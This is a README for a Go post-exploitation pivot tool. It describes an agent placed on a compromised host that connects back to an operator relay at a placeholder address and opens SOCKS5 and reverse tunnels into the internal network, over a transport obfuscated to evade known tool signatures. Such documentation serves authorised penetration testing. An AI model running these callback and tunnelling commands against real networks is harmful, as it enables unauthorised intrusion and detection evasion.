# gopivot
Self-contained Go TCP pivot agent (Chisel/Ligolo-style): reverse forwards + SOCKS5, low-signature transport.

Self-contained TCP pivot tool for post-exploitation. An agent dropped on a
foothold connects back to your relay and exposes SOCKS5 proxies and reverse
forwards into the network behind it. Pure Go (static, zero deps), with a custom
obfuscated transport so it does not share Chisel/Ligolo signatures.

## Files

| File | Platform | Role |
|------|----------|------|
| `gopivot_windows_amd64.exe` | Windows x64 | agent (victim) or relay |
| `gopivot_linux_amd64` | Linux x64 | agent (victim) or relay |

The same binary runs as either `server` or `agent`; pick the file for the OS.

## Quick start

Relay (your box), replacing the port if you want:
```
./gopivot_windows_amd64.exe server -listen 0.0.0.0:8443 -socks 127.0.0.1:1080 -transport tls
```

Agent (foothold), replacing `YOUR_IP`:
```
./gopivot_linux_amd64 agent -server YOUR_IP:8443 -name victim01 -socks 0.0.0.0:2080 -transport tls
```

Then from the relay, route tooling through the proxy:
```
curl --socks5-hostname 127.0.0.1:1080 http://<internal-host>/
```

## Features
- Reverse forwards `LISTEN=TARGET` (target dialed from the agent)
- Relay-side and agent-side SOCKS5 (bidirectional pivoting)
- `mask` (default), `raw`, `tls` transports; TLS uses an auto self-signed cert
- Auto-reconnect with capped exponential backoff + jitter, flow multiplexing, keepalives

## Flags
- `server`: `-listen`, `-socks`, `-transport`, `-v`
- `agent`: `-server`, `-name`, `-reverse`, `-socks`, `-proxy`, `-transport`, `-v`

## Notes
`mask` is obfuscation, not crypto — use `-transport tls` for encryption. Built for
authorized testing.

MIT licensed. Source builds with `go build -ldflags "-s -w" -o gopivot ./cmd/gopivot` (Go 1.21+).
****
